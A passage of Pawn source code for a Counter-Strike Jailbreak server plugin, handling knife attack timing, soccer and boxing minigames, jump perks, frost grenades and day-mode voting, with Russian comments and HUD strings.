		if(pev(id, pev_button) & IN_BACK)
		{
			g_iBoxingTypeKick[id] = 4;
			set_pdata_float(id, m_flNextAttack, 1.5);
		}
		else
		{
			g_iBoxingTypeKick[id] = 3;
			set_pdata_float(id, m_flNextAttack, 0.9);
		}
		return;
	}
	if(g_iBitWeaponStatus && IsSetBit(g_iBitWeaponStatus, id))
	{
		if(IsSetBit(g_iBitSharpening, id)) set_pdata_float(id, m_flNextAttack, 0.5);
		if(IsSetBit(g_iBitScrewdriver, id)) set_pdata_float(id, m_flNextAttack, 0.7);
		if(IsSetBit(g_iBitBalisong, id)) set_pdata_float(id, m_flNextAttack, 0.7);
		if(IsSetBit(g_iBitMachete, id)) set_pdata_float(id, m_flNextAttack, 0.5);
		if(IsSetBit(g_iBitSerp, id)) set_pdata_float(id, m_flNextAttack, 0.8);
		return;
	}
	switch(g_iUserTeam[id])
	{
		case 1: set_pdata_float(id, m_flNextAttack, 0.5);
		case 2: set_pdata_float(id, m_flNextAttack, 0.5);
	}
}

public Ham_KnifeSecondaryAttack_Post(iEntity)
{
	new id = get_pdata_cbase(iEntity, m_pPlayer, linux_diff_weapon);
	if(IsSetBit(g_iBitCuff, id))
    {
        set_pdata_float(id, m_flNextAttack, 999999.0);
        return;
    }
	if(g_bSoccerStatus && IsSetBit(g_iBitUserSoccer, id))
	{
		set_pdata_float(id, m_flNextAttack, 1.0);
		return;
	}
	if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, id))
	{
		if(pev(id, pev_button) & IN_BACK)
		{
			g_iBoxingTypeKick[id] = 2;
			set_pdata_float(id, m_flNextAttack, 1.5);
		}
		else
		{
			static iKick; iKick = !iKick;
			g_iBoxingTypeKick[id] = iKick;
			set_pdata_float(id, m_flNextAttack, 1.1);
		}
		return;
	}
	if(g_iBitWeaponStatus && IsSetBit(g_iBitWeaponStatus, id))
	{
		if(IsSetBit(g_iBitSharpening, id)) set_pdata_float(id, m_flNextAttack, 1.0);
		if(IsSetBit(g_iBitScrewdriver, id)) set_pdata_float(id, m_flNextAttack, 1.0);
		if(IsSetBit(g_iBitBalisong, id)) set_pdata_float(id, m_flNextAttack, 1.0);
		if(IsSetBit(g_iBitMachete, id)) set_pdata_float(id, m_flNextAttack, 1.0);
		if(IsSetBit(g_iBitSerp, id)) set_pdata_float(id, m_flNextAttack, 1.1);
		return;
	}
	switch(g_iUserTeam[id])
	{
		case 1: set_pdata_float(id, m_flNextAttack, 1.0);
		case 2: set_pdata_float(id, m_flNextAttack, 1.37);
	}
}

public Ham_KnifeDeploy_Post(iEntity)
{
	new id = get_pdata_cbase(iEntity, m_pPlayer, linux_diff_weapon);
	if(IsSetBit(g_iBitCuff, id))
    {
        jbe_set_cuff_model(id);
        return;
    }
	if(g_bSoccerStatus && IsSetBit(g_iBitUserSoccer, id))
	{
		if(g_iSoccerBallOwner == id) jbe_soccer_hand_ball_model(id);
		else jbe_set_hand_model(id);
		return;
	}
	if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, id))
	{
		jbe_boxing_gloves_model(id, g_iBoxingUserTeam[id]);
		return;
	}
	if(g_iBitWeaponStatus && IsSetBit(g_iBitWeaponStatus, id))
	{
	    if(IsSetBit(g_iBitShocker, id)) jbe_set_shocker_model(id);
		if(IsSetBit(g_iBitSharpening, id)) jbe_set_sharpening_model(id);
		if(IsSetBit(g_iBitScrewdriver, id)) jbe_set_screwdriver_model(id);
		if(IsSetBit(g_iBitBalisong, id)) jbe_set_balisong_model(id);
		if(IsSetBit(g_iBitMachete, id)) jbe_set_machete_model(id);
		if(IsSetBit(g_iBitSerp, id)) jbe_set_serp_model(id);
		return;
	}
	jbe_default_knife_model(id);
}

jbe_set_cuff_model(pPlayer)
{
    static iszViewModel, iszWeaponModel;
    if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szPlayerHand[CUFF_V]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szPlayerHand[CUFF_P]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
    set_pdata_float(pPlayer, m_flNextAttack, 999999.0);
}

public Ham_DoorUse(iEntity, iCaller, iActivator)
{
	if(iCaller != iActivator && pev(iEntity, pev_iuser1) == IUSER1_DOOR_KEY) return HAM_SUPERCEDE;
	return HAM_IGNORED;
}

public Ham_DoorBlocked(iBlocked, iBlocker)
{
	if(jbe_is_user_valid(iBlocker) && IsSetBit(g_iBitUserAlive, iBlocker) && pev(iBlocked, pev_iuser1) == IUSER1_DOOR_KEY)
	{
		ExecuteHamB(Ham_TakeDamage, iBlocker, 0, 0, 9999.9, 0);
		return HAM_SUPERCEDE;
	}
	return HAM_IGNORED;
}

public Ham_ObjectCaps_Post(id)
{
	if(g_iSoccerBall && g_iSoccerBallOwner == id)
	{
		if(pev_valid(g_iSoccerBall))
		{
			if(get_pdata_int(id, m_afButtonPressed, linux_diff_player) & IN_USE)
			{
				new Float:vecOrigin[3];
				pev(g_iSoccerBall, pev_origin, vecOrigin);
				if(engfunc(EngFunc_PointContents, vecOrigin) != CONTENTS_EMPTY) return;
				new iButton = pev(id, pev_button), Float:vecVelocity[3];
				if(iButton & IN_DUCK)
				{
					if(iButton & IN_FORWARD) UTIL_PlayerAnimation(id, "soccer_crouchrun");
					else UTIL_PlayerAnimation(id, "soccer_crouch_idle");
					velocity_by_aim(id, 1000, vecVelocity);
					g_bSoccerBallTrail = true;
					CREATE_BEAMFOLLOW(g_iSoccerBall, g_pSpriteBeam, 4, 5, 255, 165, 255, 130);
				}
				else
				{
					if(iButton & IN_FORWARD)
					{
						if(iButton & IN_RUN) UTIL_PlayerAnimation(id, "soccer_walk");
						else UTIL_PlayerAnimation(id, "soccer_run");
					}
					else UTIL_PlayerAnimation(id, "soccer_idle");
					velocity_by_aim(id, 600, vecVelocity);
				}
				set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
				set_pev(g_iSoccerBall, pev_velocity, vecVelocity);
				emit_sound(id, CHAN_AUTO, "jb_engine/soccer/kick_ball.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				CREATE_KILLPLAYERATTACHMENTS(id);
				jbe_set_hand_model(id);
				g_iSoccerBallOwner = 0;
				g_iSoccerKickOwner = id;
			}
		}
		else jbe_soccer_remove_ball();
	}
}

public Ham_WallThink_Post(iEntity)
{
	if(iEntity == g_iSoccerBall)
	{
		if(pev_valid(iEntity))
		{
			set_pev(iEntity, pev_nextthink, get_gametime() + 0.04);
			if(g_iSoccerBallOwner)
			{
				new Float:vecVelocity[3];
				pev(g_iSoccerBallOwner, pev_velocity, vecVelocity);
				if(vector_length(vecVelocity) > 20.0)
				{
					new Float:fAngles[3];
					vector_to_angle(vecVelocity, fAngles);
					fAngles[0] = 0.0;
					set_pev(iEntity, pev_angles, fAngles);
					set_pev(iEntity, pev_sequence, 1);
				}
				else set_pev(iEntity, pev_sequence, 0);
				velocity_by_aim(g_iSoccerBallOwner, 15, vecVelocity);
				new Float:vecOrigin[3];
				pev(g_iSoccerBallOwner, pev_origin, vecOrigin);
				vecOrigin[0] += vecVelocity[0];
				vecOrigin[1] += vecVelocity[1];
				if(pev(g_iSoccerBallOwner, pev_flags) & FL_DUCKING) vecOrigin[2] -= 18.0;
				else vecOrigin[2] -= 36.0;
				engfunc(EngFunc_SetOrigin, g_iSoccerBall, vecOrigin);
			}
			else
			{
				new Float:vecVelocity[3], Float:fVectorLength;
				pev(iEntity, pev_velocity, vecVelocity);
				fVectorLength = vector_length(vecVelocity);
				if(g_bSoccerBallTrail && fVectorLength < 600.0)
				{
					g_bSoccerBallTrail = false;
					CREATE_KILLBEAM(iEntity);
				}
				if(fVectorLength > 20.0)
				{
					new Float:fAngles[3];
					vector_to_angle(vecVelocity, fAngles);
					fAngles[0] = 0.0;
					set_pev(iEntity, pev_angles, fAngles);
					set_pev(iEntity, pev_sequence, 1);
				}
				else set_pev(iEntity, pev_sequence, 0);
				if(g_iSoccerKickOwner)
				{
					new Float:fBallOrigin[3], Float:fOwnerOrigin[3], Float:fDistance;
					pev(g_iSoccerBall, pev_origin, fBallOrigin);
					pev(g_iSoccerKickOwner, pev_origin, fOwnerOrigin);
					fBallOrigin[2] = 0.0;
					fOwnerOrigin[2] = 0.0;
					fDistance = get_distance_f(fBallOrigin, fOwnerOrigin);
					if(fDistance > 24.0) g_iSoccerKickOwner = 0;
				}
			}
		}
		else jbe_soccer_remove_ball();
	}
}

public Ham_WallTouch_Post(iTouched, iToucher)
{
	if(g_iSoccerBall && iTouched == g_iSoccerBall)
	{
		if(pev_valid(iTouched))
		{
			if(g_bSoccerBallTouch && !g_iSoccerBallOwner && jbe_is_user_valid(iToucher) && IsSetBit(g_iBitUserSoccer, iToucher))
			{
				if(g_iSoccerKickOwner == iToucher) return;
				g_iSoccerBallOwner = iToucher;
				set_pev(iTouched, pev_solid, SOLID_NOT);
				set_pev(iTouched, pev_velocity, Float:{0.0, 0.0, 0.0});
				emit_sound(iToucher, CHAN_AUTO, "jb_engine/soccer/grab_ball.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				if(g_bSoccerBallTrail)
				{
					g_bSoccerBallTrail = false;
					CREATE_KILLBEAM(iTouched);
				}
				CREATE_PLAYERATTACHMENT(iToucher, _, g_pSpriteBall, 3000);
				jbe_soccer_hand_ball_model(iToucher);
			}
			else
			{
				new Float:iDelay = get_gametime();
				static Float:iDelayOld;
				if((iDelayOld + 0.15) <= iDelay)
				{
					new Float:vecVelocity[3];
					pev(iTouched, pev_velocity, vecVelocity);
					if(vector_length(vecVelocity) > 20.0)
					{
						vecVelocity[0] *= 0.85;
						vecVelocity[1] *= 0.85;
						vecVelocity[2] *= 0.75;
						set_pev(iTouched, pev_velocity, vecVelocity);
						if((iDelayOld + 0.22) <= iDelay) emit_sound(iTouched, CHAN_AUTO, "jb_engine/soccer/bounce_ball.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
						iDelayOld = iDelay;
					}
				}
			}
		}
		else jbe_soccer_remove_ball();
	}
}

public ClientImpulse100(id)
{
	if(g_bSoccerStatus && g_iSoccerBall)
	{
		if(IsSetBit(g_iBitUserSoccer, id))
		{
			if(g_iSoccerBallOwner && g_iSoccerBallOwner != id && g_iSoccerUserTeam[g_iSoccerBallOwner] != g_iSoccerUserTeam[id])
			{
				new Float:fEntityOrigin[3], Float:fPlayerOrigin[3], Float:fDistance;
				pev(g_iSoccerBall, pev_origin, fEntityOrigin);
				pev(id, pev_origin, fPlayerOrigin);
				fDistance = get_distance_f(fEntityOrigin, fPlayerOrigin);
				if(fDistance < 60.0)
				{
					CREATE_KILLPLAYERATTACHMENTS(g_iSoccerBallOwner);
					jbe_set_hand_model(g_iSoccerBallOwner);
					g_iSoccerBallOwner = id;
					emit_sound(id, CHAN_AUTO, "jb_engine/soccer/grab_ball.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
					CREATE_PLAYERATTACHMENT(id, _, g_pSpriteBall, 3000);
					jbe_soccer_hand_ball_model(id);
				}
			}
			return PLUGIN_HANDLED;
		}
	}
	return PLUGIN_CONTINUE;
}

/*public Ham_Player_ImpulseCommands(id)
{
	if(g_bSoccerStatus && g_iSoccerBall)
	{
		if(IsSetBit(g_iBitUserSoccer, id) && pev(id, pev_impulse) == 100)
		{
			if(g_iSoccerBallOwner && g_iSoccerBallOwner != id && g_iSoccerUserTeam[g_iSoccerBallOwner] != g_iSoccerUserTeam[id])
			{
				new Float:fEntityOrigin[3], Float:fPlayerOrigin[3], Float:fDistance;
				pev(g_iSoccerBall, pev_origin, fEntityOrigin);
				pev(id, pev_origin, fPlayerOrigin);
				fDistance = get_distance_f(fEntityOrigin, fPlayerOrigin);
				if(fDistance < 60.0)
				{
					CREATE_KILLPLAYERATTACHMENTS(g_iSoccerBallOwner);
					jbe_set_hand_model(g_iSoccerBallOwner);
					g_iSoccerBallOwner = id;
					emit_sound(id, CHAN_AUTO, "jb_engine/soccer/grab_ball.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
					CREATE_PLAYERATTACHMENT(id, _, g_pSpriteBall, 3000);
					jbe_soccer_hand_ball_model(id);
				}
			}
			set_pev(id, pev_impulse, 0);
		}
	}
}*/

public Ham_ItemDeploy_Post(iEntity)
{
    new id = get_pdata_cbase(iEntity, m_pPlayer, linux_diff_weapon);
    if(IsSetBit(g_iBitCuff, id)) set_task(0.1, "taskcuf", id);
	
	if(g_bSoccerStatus || g_bBoxingStatus)
	{
		new id = get_pdata_cbase(iEntity, m_pPlayer, linux_diff_weapon);
		if(IsSetBit(g_iBitUserSoccer, id) || IsSetBit(g_iBitUserBoxing, id)) engclient_cmd(id, "weapon_knife");
	}
}

public taskcuf(id) engclient_cmd(id, "weapon_knife");

public Ham_ItemPrimaryAttack_Post(iEntity)
{
	if(g_iDuelStatus)
	{
		new id = get_pdata_cbase(iEntity, m_pPlayer, linux_diff_weapon);
		if(IsSetBit(g_iBitUserDuel, id))
		{
			switch(g_iDuelType)
			{
                case 2, 3:
				{
					set_pdata_float(id, m_flNextAttack, 11.0);
					if(task_exists(id+TASK_DUEL_TIMER_ATTACK)) remove_task(id+TASK_DUEL_TIMER_ATTACK);
					id = g_iDuelUsersId[0] != id ? g_iDuelUsersId[0] : g_iDuelUsersId[1];
					set_pdata_float(id, m_flNextAttack, 0.0);
					set_task(1.0, "jbe_duel_timer_attack", id+TASK_DUEL_TIMER_ATTACK, _, _, "a", g_iDuelTimerAttack = 11);
				}
				case 4, 6:
				{
					set_pdata_float(id, m_flNextAttack, 11.0);
					if(task_exists(id+TASK_DUEL_TIMER_ATTACK)) remove_task(id+TASK_DUEL_TIMER_ATTACK);
					id = g_iDuelUsersId[0] != id ? g_iDuelUsersId[0] : g_iDuelUsersId[1];
					set_pdata_float(id, m_flNextAttack, 0.0);
					set_pdata_float(get_pdata_cbase(id, m_pActiveItem), m_flNextSecondaryAttack, get_gametime() + 11.0, linux_diff_weapon);
					set_task(1.0, "jbe_duel_timer_attack", id+TASK_DUEL_TIMER_ATTACK, _, _, "a", g_iDuelTimerAttack = 11);
				}
			}
		}
	}
}

public Ham_PlayerJump(id)
{
	static iBitUserJump;
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsNotSetBit(g_iBitUserDuel, id) && (IsSetBit(g_iBitHingJump, id) || IsSetBit(g_iBitDoubleJump, id) || IsSetBit(g_iBitAutoBhop, id)))
	{
		if(~pev(id, pev_oldbuttons) & IN_JUMP)
		{
			new iFlags = pev(id, pev_flags);
			if(iFlags & (FL_ONGROUND|FL_CONVEYOR))
			{
				if(IsSetBit(g_iBitHingJump, id))
				{
					new Float:vecVelocity[3];
					pev(id, pev_velocity, vecVelocity);
					vecVelocity[2] = 500.0;
					set_pev(id, pev_velocity, vecVelocity);
				}
				SetBit(iBitUserJump, id);
				return;
			}
			if(IsSetBit(iBitUserJump, id) && IsSetBit(g_iBitDoubleJump, id) && ~iFlags & (FL_ONGROUND|FL_CONVEYOR|FL_INWATER))
			{
				new Float:vecVelocity[3];
				pev(id, pev_velocity, vecVelocity);
				vecVelocity[2] = 450.0;
				set_pev(id, pev_velocity, vecVelocity);
				ClearBit(iBitUserJump, id);
			}
		}
		else if(IsSetBit(g_iBitAutoBhop, id) && pev(id, pev_flags) & (FL_ONGROUND|FL_CONVEYOR))
		{
			new Float:vecVelocity[3];
			pev(id, pev_velocity, vecVelocity);
			vecVelocity[2] = 250.0;
			set_pev(id, pev_velocity, vecVelocity);
			set_pev(id, pev_gaitsequence, 6);
		}
	}
}

public Ham_PlayerResetMaxSpeed_Post(id)
{
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsNotSetBit(g_iBitUserDuel, id) && IsSetBit(g_iBitFastRun, id))
		set_pev(id, pev_maxspeed, 400.0);
}

public Ham_GrenadeTouch_Post(iTouched)
{
	if((g_iDayMode == 1 || g_iDayMode == 2) && pev(iTouched, pev_iuser1) == IUSER1_FROSTNADE_KEY)
	{
		new Float:vecOrigin[3], id;
		pev(iTouched, pev_origin, vecOrigin);
		CREATE_BEAMCYLINDER(vecOrigin, 150, g_pSpriteWave, _, _, 4, 60, _, 0, 110, 255, 165, _);
		while((id = engfunc(EngFunc_FindEntityInSphere, id, vecOrigin, 150.0)))
		{
			if(jbe_is_user_valid(id) && g_iUserTeam[id] == 2)
			{
				set_pev(id, pev_flags, pev(id, pev_flags) | FL_FROZEN);
				set_pdata_float(id, m_flNextAttack, 6.0, linux_diff_player);
				jbe_set_user_rendering(id, kRenderFxGlowShell, 0, 110, 255, kRenderNormal, 0);
				emit_sound(iTouched, CHAN_AUTO, "jb_engine/shop/freeze_player.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				SetBit(g_iBitUserFrozen, id);
				if(task_exists(id+TASK_FROSTNADE_DEFROST)) change_task(id+TASK_FROSTNADE_DEFROST, 6.0);
				else set_task(6.0, "jbe_user_defrost", id+TASK_FROSTNADE_DEFROST);
			}
		}
		emit_sound(iTouched, CHAN_AUTO, "jb_engine/shop/grenade_frost_explosion.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
		engfunc(EngFunc_RemoveEntity, iTouched);
	}
}

public HamHook_EntityBlock(iEntity, id)
{
	if(g_bRoundEnd) return HAM_SUPERCEDE;
	if(g_iDuelStatus && IsSetBit(g_iBitUserDuel, id)) return HAM_SUPERCEDE;
	return HAM_IGNORED;
}

public Ham_PlayerTouch_Post(iTouched, iToucher)
{
	if(g_iUserTeam[iTouched] != g_iUserTeam[iToucher] || g_iUserTeam[iToucher] != 1)
		return HAM_IGNORED;
	
	static Float:vOrigin[2][3];
	pev(iTouched, pev_origin, vOrigin[0]);
	pev(iToucher, pev_origin, vOrigin[1]);
	
	for(new i; i < 2; i++)
	{
		vOrigin[0][i] -= vOrigin[1][i];
		vOrigin[0][i] *= PUSH_POWER;
	}
	set_pev(iTouched, pev_velocity, vOrigin[0]);
	return HAM_SUPERCEDE;
}
/*===== <- 'hamsandwich' события <- =====*///}

/*===== -> Режимы игры -> =====*///{
game_mode_init()
{
	g_aDataDayMode = ArrayCreate(DATA_DAY_MODE);
	g_iHookDayModeStart = CreateMultiForward("jbe_day_mode_start", ET_IGNORE, FP_CELL, FP_CELL);
	g_iHookDayModeEnded = CreateMultiForward("jbe_day_mode_ended", ET_IGNORE, FP_CELL, FP_CELL);
}

public jbe_day_mode_start(iDayMode, iAdmin)
{
	new aDataDayMode[DATA_DAY_MODE];
	ArrayGetArray(g_aDataDayMode, iDayMode, aDataDayMode);
	formatex(g_szDayMode, charsmax(g_szDayMode), aDataDayMode[LANG_MODE]);
	if(aDataDayMode[MODE_TIMER])
	{
		g_iDayModeTimer = aDataDayMode[MODE_TIMER] + 1;
		set_task(1.0, "jbe_day_mode_timer", TASK_DAY_MODE_TIMER, _, _, "a", g_iDayModeTimer);
	}
	if(iAdmin)
	{
		g_iFriendlyFire = 0;
		if(g_iDayMode == 2) jbe_free_day_ended();
		else
		{
			g_iBitUserFree = 0;
			g_iFreeCount = 0;
		}
		g_iDayMode = 3;
		if(task_exists(TASK_CHIEF_CHOICE_TIME)) remove_task(TASK_CHIEF_CHOICE_TIME);
		g_iChiefId = 0;
		g_szChiefName = "";
		g_iChiefStatus = 0;
		g_iBitUserWanted = 0;
		g_szWantedNames = "";
		g_iWantedCount = 0;
		g_iBitSharpening = 0;
		g_iBitScrewdriver = 0;
		g_iBitBalisong = 0;
		g_iBitMachete = 0;
		g_iBitSerp = 0;
		g_iBitLatchkey = 0;
		g_iBitKokain = 0;
		g_iBitFrostNade = 0;
		g_iBitClothingGuard = 0;
		g_iBitHingJump = 0;
		g_iBitDoubleJump = 0;
		g_iBitAutoBhop = 0;
		g_iBitDoubleDamage = 0;
		g_iBitUserVoice = 0;
		g_MafiaGame = 0;
    	remove_task(8888);
    	mafia_off();
		for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
		{
			if(IsNotSetBit(g_iBitUserAlive, iPlayer)) continue;
			g_iBitKilledUsers[iPlayer] = 0;
			show_menu(iPlayer, 0, "^n");
			if(g_iBitWeaponStatus && IsSetBit(g_iBitWeaponStatus, iPlayer))
			{
				ClearBit(g_iBitWeaponStatus, iPlayer);
				if(get_user_weapon(iPlayer) == CSW_KNIFE)
				{
					new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem, linux_diff_player);
					if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				}
			}
			if(task_exists(iPlayer+TASK_REMOVE_SYRINGE))
			{
				remove_task(iPlayer+TASK_REMOVE_SYRINGE);
				if(get_user_weapon(iPlayer))
				{
					new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem, linux_diff_player);
					if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				}
			}
			if(pev(iPlayer, pev_renderfx) != kRenderFxNone || pev(iPlayer, pev_rendermode) != kRenderNormal)
			{
				jbe_set_user_rendering(iPlayer, kRenderFxNone, 0, 0, 0, kRenderNormal, 0);
				g_eUserRendering[iPlayer][RENDER_STATUS] = false;
			}
			if(g_iBitUserFrozen && IsSetBit(g_iBitUserFrozen, iPlayer))
			{
				ClearBit(g_iBitUserFrozen, iPlayer);
				if(task_exists(iPlayer+TASK_FROSTNADE_DEFROST)) remove_task(iPlayer+TASK_FROSTNADE_DEFROST);
				set_pev(iPlayer, pev_flags, pev(iPlayer, pev_flags) & ~FL_FROZEN);
				set_pdata_float(iPlayer, m_flNextAttack, 0.0, linux_diff_player);
				emit_sound(iPlayer, CHAN_AUTO, "jb_engine/shop/defrost_player.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				new Float:vecOrigin[3]; pev(iPlayer, pev_origin, vecOrigin);
				CREATE_BREAKMODEL(vecOrigin, _, _, 10, g_pModelGlass, 10, 25, 0x01);
			}
			if(g_iBitInvisibleHat && IsSetBit(g_iBitInvisibleHat, iPlayer))
			{
				ClearBit(g_iBitInvisibleHat, iPlayer);
				if(task_exists(iPlayer+TASK_INVISIBLE_HAT)) remove_task(iPlayer+TASK_INVISIBLE_HAT);
			}
			if(g_iBitClothingType && IsSetBit(g_iBitClothingType, iPlayer)) jbe_default_player_model(iPlayer);
			if(g_iBitFastRun && IsSetBit(g_iBitFastRun, iPlayer))
			{
				ClearBit(g_iBitFastRun, iPlayer);
				ExecuteHamB(Ham_Player_ResetMaxSpeed, iPlayer);
			}
			if(g_iBitGravRun && IsSetBit(g_iBitGravRun, iPlayer))
			{
				ClearBit(g_iBitGravRun, iPlayer);
				pev(iPlayer, pev_gravity) == 1.0;
			}
			if(g_iBitRandomGlow && IsSetBit(g_iBitRandomGlow, iPlayer)) ClearBit(g_iBitRandomGlow, iPlayer);
			if(IsSetBit(g_iBitUserHook, iPlayer) && task_exists(iPlayer+TASK_HOOK_THINK))
			{
				remove_task(iPlayer+TASK_HOOK_THINK);
				emit_sound(iPlayer, CHAN_STATIC, g_szHookSound[g_iHookSound[iPlayer]][1], VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
			}
			if(IsSetBit(g_iBitUserDemon, iPlayer) && task_exists(iPlayer+TASK_FLY_PLAYER))
			{
				remove_task(iPlayer+TASK_FLY_PLAYER);
				emit_sound(iPlayer, CHAN_STATIC, g_szFlySound[g_iFlySound[iPlayer]][1], VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
			}
		}
		if(g_bSoccerStatus) jbe_soccer_disable_all();
		if(g_bBoxingStatus) jbe_boxing_disable_all();
	}
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++) jbe_hide_user_costumes(iPlayer);
	jbe_open_doors();
}

public jbe_day_mode_timer()
{
	if(--g_iDayModeTimer) formatex(g_szDayModeTimer, charsmax(g_szDayModeTimer), "- %i", g_iDayModeTimer);
	else
	{
		g_szDayModeTimer = "";
		ExecuteForward(g_iHookDayModeEnded, g_iReturnDayMode, g_iVoteDayMode, 0);
		g_iVoteDayMode = -1;
	}
}

public jbe_vote_day_mode_start()
{
	g_iDayModeVoteTime = g_iAllCvars[DAY_MODE_VOTE_TIME] + 1;
	new aDataDayMode[DATA_DAY_MODE];
	for(new i; i < g_iDayModeListSize; i++)
	{
		ArrayGetArray(g_aDataDayMode, i, aDataDayMode);
		if(aDataDayMode[MODE_BLOCKED]) aDataDayMode[MODE_BLOCKED]--;
		aDataDayMode[VOTES_NUM] = 0;
		ArraySetArray(g_aDataDayMode, i, aDataDayMode);
	}
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsNotSetBit(g_iBitUserAlive, iPlayer)) continue;
		SetBit(g_iBitUserVoteDayMode, iPlayer);
		g_iBitKilledUsers[iPlayer] = 0;
		g_iMenuPosition[iPlayer] = 0;
		jbe_menu_block(iPlayer);
		set_pev(iPlayer, pev_flags, pev(iPlayer, pev_flags) | FL_FROZEN);
		set_pdata_float(iPlayer, m_flNextAttack, float(g_iDayModeVoteTime), linux_diff_player);
		UTIL_ScreenFade(iPlayer, 0, 0, 4, 0, 0, 0, 255);
		if(g_iUserTeam[iPlayer] == 2) SetBit(g_iBitUserVoice, iPlayer);
	}
	set_task(1.0, "jbe_vote_day_mode_timer", TASK_VOTE_DAY_MODE_TIMER, _, _, "a", g_iDayModeVoteTime);
	set_task(16.0, "jbe_sounds_start");
}

public jbe_sounds_start()
{
	new iRand = random_num(1,2);
	switch(iRand)
	{
		case 1: client_cmd(0, "mp3 play sound/jb_engine/days_mode/music_game/music_game3.mp3");
		case 2: client_cmd(0, "mp3 play sound/jb_engine/days_mode/music_game/music_game2.mp3");
	}
	UTIL_SayText(0, "!y ~ !tЗапускаю песню");
	set_task(150.0, "jbe_sounds_start", TASK_MP3);
}

public jbe_vote_day_mode_timer()
{
	if(!--g_iDayModeVoteTime) jbe_vote_day_mode_ended();
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsNotSetBit(g_iBitUserVoteDayMode, iPlayer)) continue;
		if(g_iDayWeek == 6)
		{
			if(g_iUserTeam[iPlayer] == 1) Show_DayModeMenu(iPlayer, g_iMenuPosition[iPlayer]);
			else
			{
				SetBit(g_iBitUserDayModeVoted, iPlayer);
				Show_DayModeMenu(iPlayer, g_iMenuPosition[iPlayer]);
			}
		}
		else if(g_iDayWeek == 7)
		{
			if(g_iUserTeam[iPlayer] == 2) Show_DayModeMenu(iPlayer, g_iMenuPosition[iPlayer]);
			else
			{
				SetBit(g_iBitUserDayModeVoted, iPlayer);
				Show_DayModeMenu(iPlayer, g_iMenuPosition[iPlayer]);
			}
		}
	}
}

public jbe_vote_day_mode_ended()
{
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsNotSetBit(g_iBitUserVoteDayMode, iPlayer)) continue;
		ClearBit(g_iBitUserVoteDayMode, iPlayer);
		ClearBit(g_iBitUserDayModeVoted, iPlayer);
		show_menu(iPlayer, 0, "^n");
		jbe_menu_unblock(iPlayer);
		set_pev(iPlayer, pev_flags, pev(iPlayer, pev_flags) & ~FL_FROZEN);
		set_pdata_float(iPlayer, m_flNextAttack, 0.0, linux_diff_player);
		UTIL_ScreenFade(iPlayer, 512, 512, 0, 0, 0, 0, 255, 1);
	}
	new aDataDayMode[DATA_DAY_MODE], iVotesNum;
	for(new iPlayer; iPlayer < g_iDayModeListSize; iPlayer++)
	{
		ArrayGetArray(g_aDataDayMode, iPlayer, aDataDayMode);
		if(aDataDayMode[VOTES_NUM] >= iVotesNum)
		{
			iVotesNum = aDataDayMode[VOTES_NUM];
			g_iVoteDayMode = iPlayer;
		}
	}
	ArrayGetArray(g_aDataDayMode, g_iVoteDayMode, aDataDayMode);
	aDataDayMode[MODE_BLOCKED] = aDataDayMode[MODE_BLOCK_DAYS];
	ArraySetArray(g_aDataDayMode, g_iVoteDayMode, aDataDayMode);
	ExecuteForward(g_iHookDayModeStart, g_iReturnDayMode, g_iVoteDayMode, 0);
}

/*===== <- Режимы игры <- =====*///}

/*===== -> Остальной хлам -> =====*///{
jbe_create_buyzone()
{
	new iEntity = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, "func_buyzone"));
	set_pev(iEntity, pev_iuser1, IUSER1_BUYZONE_KEY);
}

public jbe_main_informer(pPlayer)
{
	pPlayer -= TASK_SHOW_INFORMER;
	
	new szTextFD[512], szTextWanted[512];
    if(IsSetBit(g_iBitUserFree, pPlayer)) formatex(szTextFD, charsmax(szTextFD), "Ты: освобождённый");
	else if(IsNotSetBit(g_iBitUserFree, pPlayer)) formatex(szTextFD, charsmax(szTextFD), "");
	
	if(IsSetBit(g_iBitUserWanted, pPlayer)) formatex(szTextWanted, charsmax(szTextWanted), "Ты: Бунтующий");
	else if(IsNotSetBit(g_iBitUserWanted, pPlayer)) formatex(szTextWanted, charsmax(szTextWanted), "");
	
	if(g_iDayMode == 3)
	{
	    set_hudmessage(255, 165, 0, 0.3, 0.04, 0, 0.0, 0.8, 0.2, 0.2, -1);
	    ShowSyncHudMsg(pPlayer, g_iSyncMainInformer, "| %L / %L %s^n| %L^n| %L^n| %L",  
	    pPlayer, g_szDaysWeek[g_iDayWeek], pPlayer, "JBE_HUD_GAME_MODE", pPlayer, g_szDayMode, g_szDayModeTimer, 
	    pPlayer, "JBE_HUD_CHIEF", pPlayer, g_szChiefStatus[g_iChiefStatus], g_szChiefName, 
	    pPlayer, "JBE_HUD_PRISONERS", g_iAlivePlayersNum[1], g_iPlayersNum[1],
	    pPlayer, "JBE_HUD_GUARD", g_iAlivePlayersNum[2], g_iPlayersNum[2]);
	}
	else if(g_iDuelStatus)
